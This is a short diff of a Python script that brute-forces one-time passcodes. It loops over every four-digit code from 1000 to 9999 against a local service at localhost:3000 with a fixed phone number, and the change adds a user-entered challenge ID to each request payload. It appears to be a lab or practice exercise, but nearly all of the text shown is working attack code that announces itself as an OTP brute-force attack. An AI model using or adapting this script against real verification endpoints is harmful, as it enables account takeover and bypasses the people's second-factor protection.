@@ -3,6 +3,10 @@ import requests
 BASE_URL = "http://localhost:3000"
 PHONE = "+306900000099"
 
+challenge_id = int(
+    input("Enter the challenge ID: ")
+)
+
 print("Starting OTP brute-force attack...\n")
 
 for code in range(1000, 10000):
@@ -10,6 +14,7 @@ for code in range(1000, 10000):
     otp = str(code)
 
     payload = {
+        "challengeId": challenge_id,
         "phone": PHONE,
         "otp": otp
     }
